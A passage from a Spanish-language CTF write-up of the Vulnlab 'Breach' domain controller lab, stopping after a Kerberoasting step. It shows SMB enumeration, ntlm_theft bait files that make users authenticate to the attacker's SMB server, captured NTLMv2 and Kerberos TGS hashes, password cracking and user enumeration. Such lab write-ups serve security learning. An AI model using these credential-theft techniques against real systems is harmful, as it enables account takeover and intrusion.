@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Vulnlab - Breach | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Vulnlab - Breach" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/vulnlab/machines/2024/03/28/breach.html" />
+<meta property="og:url" content="http://localhost:4000/vulnlab/machines/2024/03/28/breach.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-28T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Vulnlab - Breach" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-03-28T00:00:00-06:00","datePublished":"2024-03-28T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"Vulnlab - Breach","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/vulnlab/machines/2024/03/28/breach.html"},"url":"http://localhost:4000/vulnlab/machines/2024/03/28/breach.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Vulnlab - Breach</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-03-28T00:00:00-06:00" itemprop="datePublished">
+        Mar 28, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="/assets/vulnlab/img/machines/breach/icon.png" />
+</p>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Estos son los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>targeted
+<span class="c"># Nmap 7.94SVN scan initiated Sun Mar 10 12:11:59 2024 as: nmap -sCV -p53,135,139,445,636,3389,5985,49667 -oN targeted 10.10.90.80</span>
+Nmap scan report <span class="k">for </span>10.10.90.80
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>BREACHDC.breach.vl
+| Not valid before: 2024-03-09T18:08:52
+|_Not valid after:  2024-09-08T18:08:52
+| rdp-ntlm-info:
+|   Target_Name: BREACH
+|   NetBIOS_Domain_Name: BREACH
+|   NetBIOS_Computer_Name: BREACHDC
+|   DNS_Domain_Name: breach.vl
+|   DNS_Computer_Name: BREACHDC.breach.vl
+|   DNS_Tree_Name: breach.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-03-10T18:13:11+00:00
+|_ssl-date: 2024-03-10T18:13:49+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49667/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb2-time:
+|   <span class="nb">date</span>: 2024-03-10T18:13:10
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun Mar 10 12:13:51 2024 -- 1 IP address (1 host up) scanned in 112.26 seconds</span>
+</code></pre></div></div>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<ul>
+  <li>Vamos a añadir los dominios al <strong>/etc/hosts</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.90.80 BREACHDC.breach.vl breach.vl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+➜  nmap <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
+10.10.90.80 BREACHDC.breach.vl breach.vl breachdc.breach.vl
+</code></pre></div></div>
+
+<ul>
+  <li>Estamos ante un Windows 10.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.90.80
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:BREACHDC<span class="o">)</span> <span class="o">(</span>domain:breach.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+➜  nmap
+</code></pre></div></div>
+
+<ul>
+  <li>Si tratamos de enumerar recursos por el protocolo <strong>smb</strong> con un usuario no válido, vemos que tenemos permisos de escritura en un directorio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.90.80 <span class="nt">-u</span> <span class="s1">'miguel'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:BREACHDC<span class="o">)</span> <span class="o">(</span>domain:breach.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>+] breach.vl<span class="se">\m</span>iguel:
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>+] Enumerated shares
+SMB         10.10.90.80     445    BREACHDC         Share           Permissions     Remark
+SMB         10.10.90.80     445    BREACHDC         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.90.80     445    BREACHDC         ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.90.80     445    BREACHDC         C<span class="nv">$ </span>                             Default share
+SMB         10.10.90.80     445    BREACHDC         IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.10.90.80     445    BREACHDC         NETLOGON                        Logon server share
+SMB         10.10.90.80     445    BREACHDC         share           READ,WRITE
+SMB         10.10.90.80     445    BREACHDC         SYSVOL                          Logon server share
+SMB         10.10.90.80     445    BREACHDC         Users           READ
+➜  nmap
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos estos directorios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient //10.10.90.80/share <span class="nt">-U</span> mike
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\m</span>ike]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Sun Mar 10 16:35:07 2024
+  ..                                DHS        0  Sun Mar 10 14:36:47 2024
+  finance                             D        0  Sun Mar 10 12:41:54 2024
+  software                            D        0  Sun Mar 10 12:42:11 2024
+  transfer                            D        0  Sun Mar 10 12:46:14 2024
+
+		7863807 blocks of size 4096. 2869324 blocks available
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno, como tal tenemos permisos de escritura, vamos a generar varios archivos con esta herramienta <a href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a> para que, si alguien está revisando lo que hay por detrás, podremos robar su hash <strong>ntlmv2</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ntlm_theft.py <span class="nt">-g</span> all <span class="nt">-s</span> 10.8.1.127 <span class="nt">-f</span> gracias
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a subir todos a un recurso compartido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  gracias git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls
+ </span>Autorun.inf                   <span class="s1">'gracias-(icon).url'</span>              gracias.application   gracias.m3u   zoom-attack-instructions.txt
+ desktop.ini                   <span class="s1">'gracias-(includepicture).docx'</span>   gracias.asx           gracias.pdf
+<span class="s1">'gracias-(externalcell).xlsx'</span>  <span class="s1">'gracias-(remotetemplate).docx'</span>   gracias.htm           gracias.rtf
+<span class="s1">'gracias-(frameset).docx'</span>      <span class="s1">'gracias-(stylesheet).xml'</span>        gracias.jnlp          gracias.scf
+<span class="s1">'gracias-(fulldocx).xml'</span>       <span class="s1">'gracias-(url).url'</span>               gracias.lnk           gracias.wax
+➜  gracias git:<span class="o">(</span>master<span class="o">)</span> ✗
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ejecutamos <strong>smbserver</strong> para que, en caso de que alguien los vea, nos llegue el hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  gracias git:<span class="o">(</span>master<span class="o">)</span> ✗ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora subimos los archivos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> prompt
+smb: <span class="se">\&gt;</span> mput <span class="k">*</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Nos llega el <strong>hash</strong> del usuario <strong>Julia.Wong</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  gracias git:<span class="o">(</span>master<span class="o">)</span> ✗ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.90.80,64005<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>BREACH<span class="se">\J</span>ulia.Wong,BREACHDC<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User BREACHDC<span class="se">\J</span>ulia.Wong authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Julia.Wong::BREACH:aaaaaaaaaaaaaaaa:3e40d29f310eb28c34f21d241a993d10:010100000000000080a012913c73da01d6121a030c011ad700000000010010005300490074005200460075007200440003001000530049007400520046007500720044000200100063005100410072006d007000760077000400100063005100410072006d007000760077000700080080a012913c73da01060004000200000008003000300000000000000001000000002000005dd443400a875f09d9e6d3915aca4e4296334ffc4bfb17b4f6fd97aecefd49a50a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0031002e003100320037000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.90.80,64005<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.90.80,64007<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>BREACH<span class="se">\J</span>ulia.Wong,BREACHDC<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User BREACHDC<span class="se">\J</span>ulia.Wong authenticated successfully
+</code></pre></div></div>
+
+<h2 id="cracking-hashes">Cracking Hashes</h2>
+
+<ul>
+  <li>Ahora podemos crackear el hash:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+No password hashes left to crack <span class="o">(</span>see FAQ<span class="o">)</span>
+➜  content john <span class="nt">--show</span> <span class="nb">hash
+</span>Julia.Wong:<span class="k">*********</span>:BREACH:aaaaaaaaaaaaaaaa:b1af69dd28821180ad840e6882ca2cfa:010100000000000000f9aa3c1b73da0191c4de8b02ee5c8a00000000010010006a0079006d0078006900550049006600030010006a0079006d00780069005500490066000200100075007600420065006a007a00690054000400100075007600420065006a007a00690054000700080000f9aa3c1b73da01060004000200000008003000300000000000000001000000002000005dd443400a875f09d9e6d3915aca4e4296334ffc4bfb17b4f6fd97aecefd49a50a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0031002e003100320037000000000000000000
+
+1 password <span class="nb">hash </span>cracked, 0 left
+➜  content
+</code></pre></div></div>
+
+<ul>
+  <li>Las credenciales son correctas:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.90.80 <span class="nt">-u</span> <span class="s1">'julia.wong'</span> <span class="nt">-p</span> <span class="s1">'*********'</span>
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:BREACHDC<span class="o">)</span> <span class="o">(</span>domain:breach.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>+] breach.vl<span class="se">\j</span>ulia.wong:<span class="k">******</span>
+➜  content
+</code></pre></div></div>
+
+<ul>
+  <li>Como tenemos credenciales, podemos probar enumerar con <strong>rpcclient</strong> para ver el nombre de más usuarios en el dominio y probar si alguno reutiliza la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s2">"julia.wong"</span> 10.10.90.80
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\j</span>ulia.wong]:
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[Claire.Pope] rid:[0x451]
+user:[Julia.Wong] rid:[0x452]
+user:[Hilary.Reed] rid:[0x453]
+user:[Diana.Pope] rid:[0x454]
+user:[Jasmine.Price] rid:[0x455]
+user:[George.Williams] rid:[0x456]
+user:[Lawrence.Kaur] rid:[0x457]
+user:[Jasmine.Slater] rid:[0x458]
+user:[Hugh.Watts] rid:[0x459]
+user:[Christine.Bruce] rid:[0x45a]
+user:[svc_mssql] rid:[0x45b]
+rpcclient <span class="nv">$&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Una vez añadidos a una lista, vamos a usar <strong>kerbrute</strong> <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./kerbrute userenum <span class="nt">-d</span> breach.vl <span class="nt">--dc</span> BREACHDC.breach.vl users.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 03/10/24 - Ronnie Flathers @ropnop
+
+2024/03/10 16:55:39 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2024/03/10 16:55:39 <span class="o">&gt;</span>  	BREACHDC.breach.vl:88
+
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Hilary.Reed@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Diana.Pope@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Claire.Pope@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Jasmine.Slater@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Lawrence.Kaur@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 George.Williams@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Julia.Wong@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Administrator@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Hugh.Watts@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Jasmine.Price@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 svc_mssql@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Christine.Bruce@breach.vl
+2024/03/10 16:55:39 <span class="o">&gt;</span>  Done! Tested 12 usernames <span class="o">(</span>12 valid<span class="o">)</span> <span class="k">in </span>0.363 seconds
+➜  content
+</code></pre></div></div>
+
+<ul>
+  <li>No obtenemos ningún hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt breach.vl/
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span>-] User Administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Claire.Pope doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Julia.Wong doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Hilary.Reed doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Diana.Pope doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jasmine.Price doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User George.Williams doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Lawrence.Kaur doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Jasmine.Slater doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Hugh.Watts doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User Christine.Bruce doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc_mssql doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+➜  content
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno, tampoco ningún otro usuario utiliza la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.90.80 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'*******'</span> <span class="nt">--continue-on-success</span>
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:BREACHDC<span class="o">)</span> <span class="o">(</span>domain:breach.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>-] breach.vl<span class="se">\A</span>dministrator:<span class="k">*******</span> STATUS_LOGON_FAILURE
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>-] breach.vl<span class="se">\C</span>laire.Pope:<span class="k">*******</span> STATUS_LOGON_FAILURE
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>+] breach.vl<span class="se">\J</span>ulia.Wong:<span class="k">*******</span>
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>-] breach.vl<span class="se">\H</span>ilary.Reed:<span class="k">*******</span> STATUS_LOGON_FAILURE
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>-] breach.vl<span class="se">\D</span>iana.Pope:<span class="k">*******</span> STATUS_LOGON_FAILURE
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>-] breach.vl<span class="se">\J</span>asmine.Price:<span class="k">*******</span> STATUS_LOGON_FAILURE
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>-] breach.vl<span class="se">\G</span>eorge.Williams:<span class="k">*******</span> STATUS_LOGON_FAILURE
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>-] breach.vl<span class="se">\L</span>awrence.Kaur:<span class="k">*******</span> STATUS_LOGON_FAILURE
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>-] breach.vl<span class="se">\J</span>asmine.Slater:<span class="k">*******</span> STATUS_LOGON_FAILURE
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>-] breach.vl<span class="se">\H</span>ugh.Watts:<span class="k">*******</span> STATUS_LOGON_FAILURE
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>-] breach.vl<span class="se">\C</span>hristine.Bruce:<span class="k">*******</span> STATUS_LOGON_FAILURE
+SMB         10.10.90.80     445    BREACHDC         <span class="o">[</span>-] breach.vl<span class="se">\s</span>vc_mssql:<span class="k">*******</span> STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<h1 id="svc_mssql">svc_mssql</h1>
+
+<ul>
+  <li>Bueno, lo que podemos hacer es <code class="language-plaintext highlighter-rouge">GetUserSPNs.py</code> para obtener los Service Principal Names (SPNs) asociados a la cuenta de usuario <code class="language-plaintext highlighter-rouge">julia.wong</code> en el dominio <code class="language-plaintext highlighter-rouge">breach.vl</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs breach.vl/julia.wong:<span class="k">*******</span> <span class="nt">-dc-ip</span> 10.10.90.80 <span class="nt">-request</span>
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation
+<span class="nt">--------------------------------</span>  <span class="nt">---------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
+MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2024-03-10 13:07:33.948684
+
+
+
+<span class="nv">$krb5tgs$23$*</span>svc_mssql<span class="nv">$BREACH</span>.VL<span class="nv">$breach</span>.vl/svc_mssql<span class="k">*</span><span class="nv">$5b4dae2547b8617af18129a42d692a74$74a69d21a71e72864267926604707308c0e0a55f933f0f012d0eced7716e15269d17df37c6468a985c6a60e9df91eccc3e52a2c257848c571e05ef3005067adeef97cc9e9c9e0a7c6ab48a6abd4e329adaf93f626bb3af4a8ee30722a634d2ee1f9eab777275d285916cf9bc37c26653d571fda1f34224b7ef1660c45ad846ad8cd60182a0bf6d83d905198810665ae7167e4522025262587c22afa4604596853af14fd88b3d699debda935e1217bd425e417073a50466c6ae343839c2840c70791113126dcde8281db6efb55f1830a5cae3b0141492f0ac61e17ff70d3faab994a27f27d595d12034167bd147a8058c8bc879f73ea6cf92d7f8d74207f206c283291e49ca107447b8731be259bacc31f75f26fbb993e321a5e7ed0639a5e74c4b82b43764db20168943a9af858f8e51db0d408853681063bc7b18a81690fc372f7034081eecec8138b0024c3e97023b2f8df0619f0815c8397fa3fed25fbcca297e00ebd7ba342fb72ec3bcd20d1464e493354396dbdf2e76f1ae5c391e65fd0c044a91640fed65f256b93af2aad4547c40ef245f6f7fbb66736cb47d2710f622ecf55520d90b0d08b84b1e35f798b3a52be99e7fcc7ab7ba0431f4d1dc2cefe6dad071283bd3c8f90dbe7382e44ebd0c5f669ef89c7c7ce9a0c0fbd62269d53df966326c6d3128f244be2a55934489ad82126fab57b870810d5efb34bf4b099ad4f69bf16d3ba75c379f4770b7ce446a98dd8c09f8f6033073c30a3da8b2e3b9f47d074adca10613b66672083fee8a6d84d07b7e8efa2bbff4212646a21b909fe648788474b6873f17e72f99e0df2c981ec4a82903232ff9914c2dc88e713e7cf752a3013cdc7b25245b9d9f14bbafc1c1272821f59bd9892f11583bf78f4ee3c74d51a3df1dfcfefe5b54ebdcf2418b5c1da1feb547284543e9f09a30d9510878c7e9b34010aa121d8782eb81679666c6ce4858ab7109ece8f7ff2c34cb9dd24e6adfb493d278d9c93da0abbf5a72a9ca2c61db682ef6730738bfa9f463175b05360031a2793764326ec1e630dbe784d6fbaf0d654a31f3ce527b3abf81115d283a50e84cf939021744ba52f578d57ef0299ed242812b6b8def1519a7e87dbbb4e8cc7e67a7a2eaecc61b10dd85c763dae90da0cf1adb967f7360dd0c002aa6eb0b2a09dd198d7d18efcde603597383b37b28ff9922b84447d367d8a8c0b35e84f739d2c74e9786087e6127215e513132a6f472c5ef97e3489f071d799b2095cf82756fb1d8e44bd007952afbcd43c9ca067d4fb774144d97b7e4a5c23ef39961228f3cd0f621a1ea28dc34599d64a55d31955d9a62d01f8281b4391707555c4046e5d28b8b9addf05aaba067b7970e149d3034cd1b9a56c1c8aa2e0a5894a32768b879fec62b1693dc8eab4ae317a79a97662f2f0f7e0efffbe9a1ac4ec717e4c60d3cd18afc4c914e82e2dd56be96c6d73f</span>
+➜  content
+</code></pre></div></div>
+
+<ul>
+  <li>Obtenemos un <strong>hash</strong> de kerberos del usuario <code class="language-plaintext highlighter-rouge">svc_mssql</code> que podemos <strong>crackearlo</strong>.</li>
+</ul>
